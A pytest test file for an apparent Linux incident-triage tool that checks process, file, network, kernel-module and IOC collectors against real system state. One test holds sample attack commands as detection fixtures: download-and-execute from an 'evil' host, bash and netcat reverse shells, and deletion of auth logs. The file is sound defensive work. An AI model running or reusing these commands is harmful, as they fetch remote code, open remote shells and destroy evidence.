"""
Runtime collector tests — real ``/proc``, ``/sys`` and filesystem reads.

Nothing here is mocked: the tests create real files, sockets and processes and
then require the collectors to observe them.  A collector that silently
returned empty structures (or wrong attribution) would fail these.
"""
from __future__ import annotations

import hashlib
import os
import pathlib
import socket
import sys
import tempfile
import time

import pytest

REPO = pathlib.Path(__file__).resolve().parents[1]
if str(REPO) not in sys.path:
    sys.path.insert(0, str(REPO))

from jocky.rt import detect, filefs, netfs, procfs, sysinfo  # noqa: E402


# ------------------------------------------------------------------- procfs
def test_self_is_listed_with_correct_parentage():
    assert os.getpid() in procfs.list_pids()
    info = procfs.info(os.getpid())
    assert info is not None
    assert info["pid"] == os.getpid()
    assert info["ppid"] == os.getppid()
    assert info["name"].startswith("python")
    assert os.path.basename(sys.executable) in info["cmdline"] or info["cmdline"]


def test_missing_pid_is_reported_as_missing():
    assert procfs.info(999_999) is None
    assert procfs.read_stat(999_999) is None
    assert procfs.read_cmdline(999_999) == []


def test_maps_of_self_contain_an_executable_region():
    mappings = procfs.read_maps(os.getpid())
    assert mappings, "no memory mappings for our own process"
    assert any("x" in m["perms"] for m in mappings)
    assert all(m["end"] > m["start"] for m in mappings)


def test_standard_descriptors_are_visible():
    fds = {entry["fd"] for entry in procfs.read_fds(os.getpid())}
    assert {0, 1, 2} <= fds or len(fds) > 0


def test_boot_time_is_plausible():
    boot = procfs.boot_time()
    now = time.time()
    assert 0 < boot <= now
    assert now - boot < 10 * 365 * 24 * 3600


def test_io_counters_are_read_for_this_process():
    """Regression: the path was once a literal '"/proc/{pid}/io"', so counters were always empty."""
    with open("/proc/self/stat", "rb") as fh:
        fh.read()
    counters = procfs.read_io(os.getpid())
    assert counters, "no io counters returned for our own process"
    assert counters.get("rchar", 0) > 0
    assert "syscr" in counters and "wchar" in counters


def test_process_tree_contains_self():
    tree = procfs.process_tree()
    assert os.getpid() in tree["processes"]
    assert tree["roots"], "no root processes found"


def test_deleted_but_open_file_is_detected():
    """The classic payload-hiding artefact: file unlinked, descriptor kept."""
    fd, path = tempfile.mkstemp(prefix="jky-deleted-")
    os.write(fd, b"payload")
    handle = os.fdopen(fd, "rb")
    try:
        os.unlink(path)
        found = procfs.deleted_open_files()
        assert any(item["pid"] == os.getpid() and item["path"] == path + " (deleted)"
                   for item in found), found[:5]
    finally:
        handle.close()


# ------------------------------------------------------------------- filefs
def test_hash_matches_hashlib():
    with tempfile.NamedTemporaryFile(delete=False) as fh:
        fh.write(b"jocky" * 1000)
        path = fh.name
    try:
        assert filefs.hash_file(path) == hashlib.sha256(b"jocky" * 1000).hexdigest()
        assert filefs.hash_file(path + ".missing") is None
    finally:
        os.unlink(path)


def test_permission_flags_are_read_from_the_target():
    path = tempfile.mktemp(prefix="jky-perm-")
    with open(path, "w") as fh:
        fh.write("x")
    try:
        os.chmod(path, 0o777)
        entry = filefs.stat_entry(path)
        assert entry["world_writable"] is True
        assert entry["executable"] is True
        os.chmod(path, 0o4755)
        entry = filefs.stat_entry(path)
        assert entry["setuid"] is True
        assert entry["world_writable"] is False
    finally:
        os.unlink(path)


def test_magic_identifies_executables_and_scripts():
    assert filefs.magic("/bin/sh") in ("elf", "script:sh", "script:bash")
    path = tempfile.mktemp(prefix="jky-script-")
    with open(path, "w") as fh:
        fh.write("#!/usr/bin/env python3\nprint(1)\n")
    try:
        assert filefs.magic(path).startswith("script:")
    finally:
        os.unlink(path)


def test_scan_and_timeline_respect_bounds():
    with tempfile.TemporaryDirectory(prefix="jky-scan-") as root:
        for index in range(5):
            with open(os.path.join(root, f"file{index}.txt"), "w") as fh:
                fh.write("x" * index)
        entries = filefs.scan(root, max_files=3)
        assert len(entries) <= 3
        assert all("magic" in entry for entry in entries)
        matched = filefs.scan(root, pattern="file3")
        assert len(matched) == 1 and matched[0]["path"].endswith("file3.txt")
        timeline = filefs.timeline(root, limit=10)
        assert timeline == sorted(timeline, key=lambda e: e["mtime"], reverse=True)


def test_path_dirs_resolves_symlinks_before_judging_permissions():
    with tempfile.TemporaryDirectory(prefix="jky-path-") as root:
        real = os.path.join(root, "real")
        os.mkdir(real)
        os.chmod(real, 0o777)
        link = os.path.join(root, "link")
        os.symlink(real, link)

        entries = {e["path"]: e for e in filefs.path_dirs(os.pathsep.join([link, "/usr/bin"]))}
        assert entries[link]["resolved"] == os.path.realpath(real)
        assert entries[link]["hijackable"] is True
        assert entries["/usr/bin"]["hijackable"] is False
        assert entries["/usr/bin"]["resolved"] == os.path.realpath("/usr/bin")


def test_ld_preload_probe_shape():
    report = filefs.ld_preload()
    assert report["path"] == "/etc/ld.so.preload"
    assert isinstance(report["entries"], list)


# -------------------------------------------------------------------- netfs
@pytest.fixture()
def listening_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("127.0.0.1", 0))
    sock.listen(1)
    yield sock
    sock.close()


def test_listener_is_seen_and_attributed_to_this_process(listening_socket):
    port = listening_socket.getsockname()[1]
    rows = [c for c in netfs.connections() if c.get("local_port") == port]
    assert rows, "our own listener is missing from /proc/net/tcp"
    row = rows[0]
    assert row["local_addr"] == "127.0.0.1"
    assert row["state"] == "LISTEN"
    assert row["pid"] == os.getpid(), row
    assert row["process"] and row["process"].startswith("python")
    assert any(c["local_port"] == port for c in netfs.listeners())


def test_unusual_listener_is_reported_for_ephemeral_port(listening_socket):
    port = listening_socket.getsockname()[1]
    unusual = [c["local_port"] for c in netfs.unusual_listeners()]
    assert port in unusual


def test_socket_inode_map_matches_fd_link(listening_socket):
    inode = None
    for entry in procfs.read_fds(os.getpid()):
        if entry.get("kind") == "socket":
            inode = entry["inode"]
    assert inode is not None
    owners = procfs.socket_inode_map()
    assert inode in owners
    assert owners[inode]["pid"] == os.getpid()


def test_interfaces_and_routes_are_populated():
    interfaces = netfs.interfaces()
    assert any(iface["name"] == "lo" for iface in interfaces)
    loopback = next(iface for iface in interfaces if iface["name"] == "lo")
    assert loopback["mac"] is not None
    routes = netfs.routes()
    assert routes and any(route["iface"] for route in routes)


# ------------------------------------------------------------------ sysinfo
def test_kernel_matches_os_uname():
    kernel = sysinfo.kernel()
    uname = os.uname()
    assert kernel["release"] == uname.release
    assert kernel["hostname"] == uname.nodename
    assert kernel["machine"] == uname.machine


def test_memory_and_cpu_are_positive():
    assert sysinfo.memory().get("MemTotal", 0) > 0
    assert sysinfo.cpu()["cpus"] >= 1
    assert len(sysinfo.loadavg()) == 3


def test_mounts_include_root():
    mounts = sysinfo.mounts()
    assert any(m["mountpoint"] == "/" for m in mounts)


def test_module_views_agree_on_loadable_modules():
    """Pins the built-in filter: /sys/module lists subsystems too, /proc/modules does not."""
    proc_modules = {m["name"].replace("-", "_") for m in sysinfo.modules()}
    loadable = {n.replace("-", "_") for n in sysinfo.loadable_module_names()}
    assert proc_modules == loadable, (proc_modules ^ loadable)
    diff = sysinfo.hidden_modules()
    assert diff["in_proc_not_sys"] == []
    assert diff["in_sys_not_proc"] == []


# ------------------------------------------------------------------- detect
def test_ioc_match_finds_this_process_by_name():
    report = detect.ioc_match({"names": ["python"]})
    assert report["matches"], "own interpreter not matched by name IOC"
    assert any(match["where"] == "process" for match in report["matches"])
    assert report["scanned"]["processes"] >= 1


def test_ioc_match_finds_file_by_hash():
    with tempfile.NamedTemporaryFile(delete=False, suffix=".ioc") as fh:
        fh.write(b"indicator-of-compromise")
        path = fh.name
    try:
        digest = hashlib.sha256(b"indicator-of-compromise").hexdigest()
        report = detect.ioc_match({"hashes": [digest]}, scan_root=os.path.dirname(path))
        assert any(match["kind"] == "hash" and match["detail"] == path
                   for match in report["matches"]), report["matches"]
    finally:
        os.unlink(path)


def test_command_line_patterns_match_canonical_examples():
    import re

    samples = {
        "download-and-execute": "curl http://evil/x.sh | sh",
        "bash-reverse-shell": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "netcat-exec": "nc -e /bin/sh 10.0.0.1 4444",
        "temp-chmod-exec": "chmod +x /tmp/payload",
        "base64-decode": "echo aGVsbG8= | base64 -d",
        "log-tampering": "rm -rf /var/log/auth.log",
    }
    for label, sample in samples.items():
        pattern = next(p for p, name, _sev in detect.CMD_PATTERNS if name == label)
        assert re.search(pattern, sample), (label, sample)


def test_triage_report_shape():
    report = detect.triage(deep=False)
    assert isinstance(report["findings"], list)
    assert set(report["counts"]) >= {"info", "low", "medium", "high", "critical"}
    assert report["scanned"]["processes"] >= 1
    assert report["duration_ms"] > 0
    for finding in report["findings"]:
        assert set(finding) >= {"check", "severity", "title", "evidence"}
        assert finding["severity"] in detect.SEVERITY_ORDER


def test_check_catalog_covers_every_emitted_check():
    """Docs are generated from the catalog, so an uncatalogued check would lie."""
    catalogued = {entry["check"] for entry in detect.CHECK_CATALOG}
    emitted = {finding["check"] for finding in detect.triage(deep=True)["findings"]}
    assert emitted <= catalogued, f"undocumented checks: {sorted(emitted - catalogued)}"
    for entry in detect.CHECK_CATALOG:
        assert set(entry) >= {"check", "severity", "source", "summary", "action"}


def test_triage_reports_visibility_coverage():
    report = detect.triage(deep=False)
    scanned = report["scanned"]
    assert 0.0 < scanned["coverage"] <= 1.0
    assert scanned["unreadable_processes"] >= 0
    if scanned["coverage"] < 0.95:
        assert any(finding["check"] == "partial_visibility"
                   for finding in report["findings"]), \
            "a blind scan must not look like a clean scan"


def test_sys_users_does_not_crash():
    """Regression: logged_in_users read a 'tty' key read_stat never returned."""
    assert isinstance(sysinfo.logged_in_users(), list)


def test_self_has_no_anonymous_executable_mappings():
    """A plain interpreter has JIT-free mappings: the rwx check must not flag us."""
    mappings = [m for m in procfs.read_maps(os.getpid()) if m["rwx"] and m["anonymous"]]
    assert not any(m["memfd"] for m in mappings)
